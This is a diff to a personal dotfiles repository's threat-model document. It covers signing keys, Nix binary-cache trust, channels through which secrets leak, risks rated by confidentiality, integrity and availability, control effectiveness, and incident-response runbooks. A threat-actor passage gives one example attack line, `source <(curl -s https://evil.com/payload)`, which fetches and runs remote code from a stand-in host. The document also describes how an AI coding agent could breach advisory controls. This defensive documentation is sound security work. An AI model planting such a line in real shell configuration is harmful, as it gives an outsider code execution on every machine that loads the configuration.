@@ -16,12 +16,14 @@ This is not a theoretical concern. The repo previously stored age-encrypted SSH 
 
 | Asset | Sensitivity | Storage | Notes |
 |-------|-------------|---------|-------|
-| SSH private keys | High | `~/.ssh/`, 1Password, mount cache | Per-machine ed25519 keys; authenticate to Git registries and remote hosts |
-| SSH public keys | Low | Repo (`.pub` sidecars), registries | Public by nature; committed for fingerprint validation |
+| SSH auth keys | High | `~/.ssh/id_ed25519`, 1Password, mount cache | Per-machine; passphrase-protected; authenticate to registries and remote hosts |
+| SSH signing keys | High | `~/.ssh/id_ed25519_signing`, 1Password | Per-machine; no passphrase; prove commit authorship. Compromise enables forging verified commits. |
+| SSH public keys | Low | Repo (`.pub` sidecars), registries | Public by nature; committed for fingerprint validation and signing key registration |
 | Secrets (PATs, URLs, credentials) | High | `~/secrets/`, 1Password, mount cache | Service tokens, calendar URL, netrc; per-machine subsets |
 | Age passphrases | High | Operator memory / 1Password | Protect any locally-encrypted material; no escrow |
 | Host inventory (hostnames) | Low | Repo (filenames, config) | Hostnames in `.pub` filenames and config; enables correlation |
 | Deployment scripts | High (integrity) | Repo | `update-env`, `init.bash`, nix expressions. Execute with full user privileges on every machine. Compromise = arbitrary code execution across the fleet |
+| Nix binary cache trust | High (integrity) | `/etc/nix/nix.conf` trusted keys | `cache.nixos.org` key is trusted by default. A compromised cache or substituter can inject malicious binaries into any nix-managed package |
 | Shell config, nix config | None | Repo | Public; no secrets in config files |
 
 ## Threat Actors
@@ -65,7 +67,9 @@ The following threat actors and attack vectors are the ones this security model 
 
 *Code injection via init.bash:* Modifying `bash/init.bash` or any `bash/apps/*/init.bash` runs payload code on every interactive shell start across the fleet. Unlike `update-env` (run deliberately), init.bash runs automatically. An attacker could add `source <(curl -s https://evil.com/payload)` to a sourced file.
 
-*Nix supply chain:* Modify `flake.lock` to point a `flake = false` input (task.bash, mk.bash, tesht) to a compromised commit. The hash change is visible in the lock diff but easy to miss in a large commit. The compromised code runs when nix builds the derivation.
+*Nix supply chain -- flake inputs:* Modify `flake.lock` to point a `flake = false` input (task.bash, mk.bash, tesht) to a compromised commit. The hash change is visible in the lock diff but easy to miss in a large commit. The compromised code runs when nix builds the derivation.
+
+*Nix supply chain -- binary cache:* `cache.nixos.org` is trusted by default (its public key is in nix.conf). A compromised binary cache or substituter can serve malicious pre-built packages for any derivation. Nix verifies signatures against trusted public keys, so this requires compromising the cache's signing key -- not trivial, but the blast radius is every nix user. The system does not use any third-party binary caches beyond `cache.nixos.org` (the Lix cache `cache.lix.systems` has been removed). Flake lock pins input hashes, but binary substitution happens after hash verification of the source -- a compromised cache serves a different binary for the same source hash.
 
 *.pub sidecar replacement:* Replace `ssh/id_ed25519_<hostname>.pub` with the attacker's public key. On next cache restore, fingerprint validation passes against the attacker's `.pub`. The cache key (which is the real key) doesn't match, so restore fails -- but the error message says "fingerprint mismatch," which could lead Ted to trust the repo `.pub` and discard the legitimate local key.
 
@@ -269,6 +273,8 @@ Exact moments secrets appear in cleartext on disk or in memory:
 | 1299-1314 | Individual secrets | Plaintext files | `~/secrets.stage.XXXXXX/` (mktemp -d, mode 700) | Extraction through move (~seconds) | 700 (dir), 600 (files) |
 | 1318-1323 | Individual secrets | Plaintext files | `$CrostiniDir/secrets/<hostname>/` | Persistent (cache) | 700 (dir), 600 (files); shared mount caveats |
 | permanent | Individual secrets | Plaintext files | `~/secrets/` | Persistent (operational) | 700 (dir), 600 (files) |
+| restoreSigningKey | SSH signing key | Plaintext | `~/.ssh/id_ed25519_signing` | Persistent (operational) | 600 (no passphrase) |
+| restoreSigningKey | SSH signing key | Plaintext (1Password) | Process memory during `op read` | Retrieval (~seconds) | N/A (memory only, written to file with 600) |
 | 550 | Bitbucket PAT | Env var | `.envrc` file + shell environment | Shell session lifetime | File: default umask; env: process memory |
 | 555 | Confluence PAT | Env var | `.envrc` file + shell environment | Shell session lifetime | Same |
 | 1345 | SSH key passphrase | TTY input | Process memory only | keychain invocation | N/A (not on disk) |
@@ -314,6 +320,23 @@ Nix store paths (`/nix/store/`) are world-readable by design. Secrets must never
 - `systemd.user.services` `Environment=` directives (visible in unit files and journal)
 
 Current implementation is correct: secrets are file-based (`~/secrets/`), read at runtime by consumers, never interpolated into nix expressions. The `.envrc` secret export (lines 550, 555) is generated by `update-env` at runtime, not by nix.
+
+### Secret exposure channels
+
+Secrets that reach disk or memory can leak through channels beyond direct file access. These apply to all threat actors with local access (local malware, ChromeOS host, Claude Code, backup agents).
+
+| Channel | What leaks | Mitigation | Status |
+|---------|-----------|------------|--------|
+| Shell history | Commands containing secrets (if typed/pasted at prompt) | `age -p` reads from TTY, not argv. `op` uses session tokens, not inline secrets. Don't type secrets as command arguments. | Mitigated by design |
+| `/proc/<pid>/environ` | Env vars from `with-secret` and `.envrc` PAT exports | `with-secret` uses `exec` (bounded lifetime). `.envrc` exports persist for shell session. | Partially mitigated |
+| Process argv | Secrets passed as command-line arguments | Not done in current code. `ssh-keygen` passphrase uses `-N ""` (empty, not secret). | Not applicable |
+| Swap / hibernation | Any in-memory secret | Encrypted swap (LUKS) on NixOS protects at rest. Crostini swap behavior depends on ChromeOS. | Platform-dependent |
+| Core dumps | Process memory snapshots | Default `ulimit -c` allows core dumps. Not explicitly disabled. | Not mitigated |
+| tmux scrollback | Secrets displayed on terminal | `update-env` does not print secret values. `op read` output goes to file, not terminal. | Mitigated by design |
+| Clipboard (`wl-copy`/`cliphist`) | Secrets copied from 1Password or terminal | `cliphist` persists clipboard history to disk. Pasting a passphrase from 1Password leaves it in clipboard history. | Not mitigated |
+| Editor swap/backup/undo | Secrets in files being edited | Vim/Neovim create `.swp`, `~` backup, and `.un~` undo files. If `~/secrets/*` is edited, plaintext appears in editor temp files. | Not mitigated |
+| systemd journal | stdout/stderr from user services | `khal-notify`, `vdirsyncer` log to journal. Services do not log secret values, but misconfigured services could. | Mitigated by design |
+| Nix store | Secrets interpolated into derivations | Nix store is world-readable. Secrets must never appear in derivation outputs, `home.sessionVariables`, `home.file` source, or `systemd Environment=`. | Mitigated by policy (see [Nix/home-manager secret boundary](#nixhome-manager-secret-boundary)) |
 
 ## Trust Boundaries
 
@@ -421,36 +444,50 @@ TOFU (Trust On First Use): `StrictHostKeyChecking=accept-new` accepts unknown ho
 
 ## Accepted Risks
 
-| Risk | Severity | Rationale |
-|------|----------|-----------|
-| Bootstrap clone is unauthenticated HTTPS | High | First clone on a bare machine has no content verification. Mitigated by cloning on trusted networks; subsequent pulls use SSH |
-| `.pub` metadata leakage (hostnames, fingerprints) | Low | Public keys are public; host inventory of a personal fleet has minimal adversarial value |
-| Mount cache plaintext on ChromeOS host | Medium | Required for usable Crostini restore; ChromeOS session isolation is the boundary |
-| First clone unauthenticated (commit signatures not verified on clone) | Medium | Signed commits protect pushes but not initial checkout. Mitigated by cloning on trusted networks |
-| TOFU host keys on first contact | Low | Initial setup on trusted networks; changed keys rejected afterward |
-| No backup agent exclusion enforcement | Low | Relies on not configuring backups to include sensitive paths |
-| ssh-agent socket accessible to local processes | Medium | Standard SSH model; agent forwarding disabled by default |
-| 1Password as single durable store | Medium | Account lockout or service outage blocks bare-machine bootstrap. Mitigated by local copies and cache on existing machines |
-| Claude Code has full local access | Medium | Advisory CLAUDE.md directive + tool approval are the only controls. Accepted as inherent to AI-assisted development |
+Severity is separated by security property. A risk may be High for confidentiality but Low for integrity.
+
+| Risk | C | I | A | Rationale |
+|------|---|---|---|-----------|
+| Mount cache plaintext on ChromeOS host | **High** | Low | Low | Persistent plaintext SSH keys and secrets on host-visible shared storage. ChromeOS session isolation is the only boundary -- POSIX modes may not be enforced. This is the dominant day-to-day confidentiality exposure, not a footnote. Accepted because passphrase-free restore on container reset is operationally required for disposable Crostini VMs. |
+| Bootstrap clone is unauthenticated HTTPS | Low | **High** | Low | First clone has no content verification. Compromised repo at clone time = arbitrary code execution across fleet. Mitigated by cloning on trusted networks; subsequent pulls use SSH. |
+| First clone: commit signatures not verified | Low | **High** | Low | Signed commits protect pushes but `git clone` does not verify signatures. Mitigated by cloning on trusted networks. |
+| Claude Code has full local access | Medium | **High** | Low | Can read secrets (confidentiality), modify repo/update-env (integrity), and interact with `op` if authenticated. Advisory CLAUDE.md directive + tool approval are the only controls. Not equivalent to "local malware" -- also has remote context retention and automated code modification capability. |
+| ssh-agent socket accessible to local processes | Medium | Medium | Low | Any same-user process can use loaded keys for signing or SSH auth. Agent forwarding disabled by default. |
+| 1Password as single durable store | Low | Low | **High** | Account lockout or service outage blocks bare-machine bootstrap. Mitigated by local copies and cache on existing machines. |
+| `.pub` metadata leakage (hostnames, fingerprints) | Low | Low | Low | Public keys are public; host inventory of a personal fleet has minimal adversarial value |
+| TOFU host keys on first contact | Low | Low | Low | Initial setup on trusted networks; changed keys rejected afterward |
+| No backup agent exclusion enforcement | Medium | Low | Low | Relies on not configuring backups to include sensitive paths. ChromeOS backup behavior for MyFiles/Downloads not fully characterized. |
+| Signing key has no passphrase | Medium | Low | Low | Accepted convenience tradeoff, not equivalently safe to passphrase-protected keys. Increases exposure to offline disk theft, accidental backup leakage, and low-grade malware that can read files but not interact with an agent. |
 
 ## Controls Summary
 
-| Control | What it protects | Mechanism |
-|---------|-----------------|-----------|
-| 1Password vault | SSH keys, secrets at rest | Vault encryption + master password + 2FA |
-| `op` CLI session | In-transit retrieval | Biometric/password auth, 10-min memory cache |
-| File permissions | Local plaintext | `chmod 600` (keys), `chmod 700` (dirs) |
-| Signal traps | Temp file cleanup | `withCleanupTrap` in `update-env` |
-| `SSH_ASKPASS_REQUIRE=never` | Askpass fallback | Prevents broken nix askpass from leaking prompts |
-| `.gitignore` | Accidental commit | Advisory; blocks `git add` for private key patterns |
-| Fingerprint validation | Key/hostname mismatch | Self-consistency check against repo `.pub` |
-| TOFU host keys | MITM on established connections | `accept-new` policy in SSH config |
-| SHA-256 hash verification | Downloaded binaries | Pinned hash checked before execution/install (gpoc .deb) |
-| SSH commit signing | Commit authorship | Per-machine signing key (separate from auth key); unsigned commits rejected by GitHub |
-| Branch protection | Repo integrity | Require signed commits on `main`, disallow force-push |
-| History rewrite + rotation | Past exposure | Strip + force-push + credential rotation after incidents |
-| CLAUDE.md secrets directive | AI agent secret access | Advisory; instructs Claude Code not to read/display/handle secrets |
-| Tool approval prompts | AI agent actions | User reviews tool calls before execution; can deny |
+Effectiveness: **prevents** (blocks the attack), **detects** (reveals it happened), **slows** (raises attacker cost without blocking).
+
+| Control | Protects | Effectiveness | Mechanism |
+|---------|----------|---------------|-----------|
+| 1Password vault | SSH keys, secrets at rest | Prevents | Vault encryption + master password + 2FA + server-side rate limiting |
+| `op` CLI session | In-transit retrieval | Prevents | Biometric/password auth, 10-min memory cache, no disk persistence |
+| File permissions | Local plaintext | Slows | `chmod 600`/`700`. Defense-in-depth on multi-user systems; not a boundary on single-user Crostini containers |
+| Signal traps | Temp file cleanup | Prevents (partial) | `withCleanupTrap` in `update-env`. Covers INT/TERM; not KILL or power loss |
+| `SSH_ASKPASS_REQUIRE=never` | Askpass fallback | Prevents | Blocks broken nix askpass from leaking prompts to unexpected processes |
+| `.gitignore` | Accidental commit | Slows | Advisory; blocks `git add` for private key patterns. Not a security boundary -- `git add -f` bypasses |
+| Fingerprint validation | Key/hostname mismatch | Detects | Self-consistency check against repo `.pub`. Does not detect repo compromise |
+| TOFU host keys | MITM on established connections | Prevents (after first use) | `accept-new` policy. First contact trusts the network |
+| SHA-256 hash verification | Downloaded binaries | Prevents | Pinned hash checked before execution/install. Only as strong as repo integrity (hash is stored in repo) |
+| SSH commit signing | Commit authorship | Detects | Per-machine signing key. Unsigned/foreign-signed commits visible in `git log --show-signature` and rejected by GitHub |
+| Branch protection | Repo integrity | Prevents | Require signed commits on `main`, disallow force-push |
+| History rewrite + rotation | Past exposure | Slows | Strip + force-push + rotation. Assumes copies exist in forks/caches/mirrors -- rotation is the real remediation, not deletion |
+| CLAUDE.md secrets directive | AI agent secret access | Slows | Advisory only. A confused or jailbroken model can violate it. Not a security control -- a friction mechanism |
+| Tool approval prompts | AI agent actions | Slows | User can deny tool calls. Effective against obvious exfiltration; less effective against subtle injection in large diffs |
+
+**Controls not yet implemented** (required for higher assurance):
+
+| Control | Protects | Priority | Status |
+|---------|----------|----------|--------|
+| Eliminate `curl \| sh` (Lix installer) | Bootstrap integrity | P1 | Replace with hash-verified official Nix installer |
+| Hash-verify `task.bash` download | Bootstrap integrity | P1 | Add SHA-256 check or vendor locally |
+| Signing key registration preflight | Commit verification | P1 | Detect unregistered signing key before first push to protected branch |
+| Signed tag/release for bootstrap | Bootstrap authenticity | P3 | Verify repo content before executing `update-env` on fresh machine |
 
 ## Incident Response
 
@@ -490,6 +527,75 @@ TOFU (Trust On First Use): `StrictHostKeyChecking=accept-new` accepts unknown ho
 3. If malicious commits found: do not run `update-env` on any machine until the repo is verified clean
 4. Force-push a known-good state from a trusted machine
 5. Rotate SSH keys (the attacker may have replaced `.pub` sidecars to enable their own key)
+
+### SSH key compromise (auth or signing)
+
+Separate from machine compromise -- covers scenarios where a key is leaked (backup exposure, accidental commit) but the machine itself is not compromised.
+
+**Auth key:**
+1. **Contain:** deregister the compromised `.pub` from all registries immediately (GitHub, Codeberg, Bitbucket, Stash)
+2. Delete local key: `rm ~/.ssh/id_ed25519{,.pub}`
+3. Delete repo sidecar: `rm ~/dotfiles/ssh/id_ed25519_$HOST.pub`
+4. Clear mount cache: `rm -rf $CrostiniDir/ssh/$HOST/`
+5. Remove from 1Password (or archive with "COMPROMISED" label)
+6. Generate new key: `update-env` (UC-4a)
+7. Register new key with all registries
+8. Commit new sidecar and push
+9. Review `authorized_keys` on any hosts where the key was used
+10. Review `known_hosts` for signs of MITM during the exposure window
+
+**Signing key:**
+1. **Contain:** remove signing key from GitHub/Codeberg signing key settings
+2. Delete local key and repo sidecar
+3. Remove from 1Password
+4. Generate new key: `update-env`
+5. Register new key on GitHub/Codeberg
+6. Commit new sidecar and push
+7. **Assess provenance impact:** commits signed with the compromised key are now suspect. Review `git log --show-signature` for any commits not authored by Ted during the exposure window.
+
+### Poisoned bootstrap / malicious commit
+
+The repo was modified by an unauthorized party (GitHub account compromise, supply chain attack, or social engineering).
+
+1. **Freeze:** do not run `update-env`, `home-manager switch`, or `source ~/.bashrc` on any machine until the repo is verified
+2. **Identify first bad commit:** compare local repo on a known-good machine against GitHub. `git log --show-signature` -- unsigned or foreign-signed commits are suspect
+3. **Inventory affected hosts:** which machines ran `update-env` or pulled since the first bad commit?
+4. **Assess blast radius:** what did the bad commit modify?
+   - `update-env` or `scripts/` -> credential theft, backdoor installation possible
+   - `bash/` or `init.bash` -> persistent code execution on every shell start
+   - `*.nix` or `flake.lock` -> package substitution, nix evaluation-time code execution
+   - `ssh/*.pub` -> fingerprint validation poisoned
+5. **On affected hosts:** treat as machine compromise (above). Do not trust any tooling from the repo on those machines -- use out-of-band recovery
+6. **On a trusted machine:** force-push a known-good state (temporarily disable branch protection)
+7. **Re-establish trust:** re-enable branch protection, rotate all credentials that may have been exposed, review `authorized_keys` on remote hosts
+8. **Post-incident:** update this doc, review whether signed tag verification for bootstrap would have prevented the attack
+
+### Lost or stolen Chromebook
+
+The ChromeOS host and its shared mount cache are in adversary hands.
+
+**If device was locked (screen lock active, no developer mode):**
+1. Remotely wipe via Google Admin or chrome.google.com/sync (if enrolled)
+2. Rotate SSH auth key for that hostname (UC-4a) -- mount cache had plaintext
+3. Rotate all secrets that were cached on that machine (UC-4b)
+4. Deregister old auth and signing keys from registries
+5. Invalidate 1Password trusted device if the Chromebook had 1Password app
+6. Review browser sessions -- GitHub, Codeberg, 1Password web sessions may have been active
+
+**If device was unlocked or in developer mode:**
+1. Treat as full compromise of all cached material:
+   - SSH auth key (plaintext in mount cache)
+   - All secrets (plaintext in mount cache)
+   - SSH signing key (plaintext in `~/.ssh/` if Crostini was running)
+   - Any active browser sessions (GitHub, 1Password, work services)
+2. Rotate everything: auth key, signing key, all secrets, all service credentials
+3. Deregister all old keys from all registries
+4. Revoke 1Password trusted device and all sessions
+5. Revoke GitHub sessions
+6. Review `authorized_keys` on remote hosts
+7. If the attacker had time to modify the repo: treat as poisoned bootstrap (above)
+
+**If device status is unknown:** treat as unlocked.
 
 ## Maintenance
 
